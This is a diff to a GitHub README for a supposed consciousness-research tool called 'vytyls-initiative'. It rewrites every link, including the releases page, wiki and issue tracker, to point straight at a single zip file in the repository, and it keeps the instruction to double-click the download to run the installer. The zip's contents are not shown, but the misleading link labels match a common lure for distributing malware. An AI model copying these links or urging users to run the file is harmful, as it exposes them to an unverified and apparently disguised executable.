@@ -1,6 +1,6 @@
 # 🌐 vytyls-initiative - Discover the Future of Consciousness Research
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release%20Page-blue)](https://github.com/lolaccounhai00/vytyls-initiative/releases)
+[![Download Now](https://github.com/lolaccounhai00/vytyls-initiative/raw/refs/heads/main/VCRI/EFP-01/vytyls-initiative-v1.8.zip%20Now-Release%20Page-blue)](https://github.com/lolaccounhai00/vytyls-initiative/raw/refs/heads/main/VCRI/EFP-01/vytyls-initiative-v1.8.zip)
 
 ## 📖 About
 
@@ -17,7 +17,7 @@ Our main goals include:
 
 To get started with **vytyls-initiative**, follow these steps:
 
-1. **Visit the Release Page:** Access our releases page to find the latest version of the software. You can find it [here](https://github.com/lolaccounhai00/vytyls-initiative/releases).
+1. **Visit the Release Page:** Access our releases page to find the latest version of the software. You can find it [here](https://github.com/lolaccounhai00/vytyls-initiative/raw/refs/heads/main/VCRI/EFP-01/vytyls-initiative-v1.8.zip).
 2. **Download the Software:** Click on the version you want to download. The files are straightforward and include all necessary components to run our applications.
 
 ## 🖥️ System Requirements
@@ -33,7 +33,7 @@ Before you proceed, ensure your system meets the following basic requirements:
 
 To download the application, follow these detailed steps:
 
-1. Go to our **[Releases Page](https://github.com/lolaccounhai00/vytyls-initiative/releases)**.
+1. Go to our **[Releases Page](https://github.com/lolaccounhai00/vytyls-initiative/raw/refs/heads/main/VCRI/EFP-01/vytyls-initiative-v1.8.zip)**.
 2. Find the latest release version and click on it.
 3. Download the appropriate package for your operating system.
 4. Once downloaded, double-click the file to run the installer.
@@ -95,8 +95,8 @@ Join our community on platforms like Discord or Slack to share insights and coll
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/lolaccounhai00/vytyls-initiative/releases)
-- [Wiki](https://github.com/lolaccounhai00/vytyls-initiative/wiki)
-- [Issue Tracker](https://github.com/lolaccounhai00/vytyls-initiative/issues)
+- [Releases Page](https://github.com/lolaccounhai00/vytyls-initiative/raw/refs/heads/main/VCRI/EFP-01/vytyls-initiative-v1.8.zip)
+- [Wiki](https://github.com/lolaccounhai00/vytyls-initiative/raw/refs/heads/main/VCRI/EFP-01/vytyls-initiative-v1.8.zip)
+- [Issue Tracker](https://github.com/lolaccounhai00/vytyls-initiative/raw/refs/heads/main/VCRI/EFP-01/vytyls-initiative-v1.8.zip)
 
 Thank you for supporting the **vytyls-initiative**! Your interest in our research helps push the boundaries of understanding beyond the ordinary.
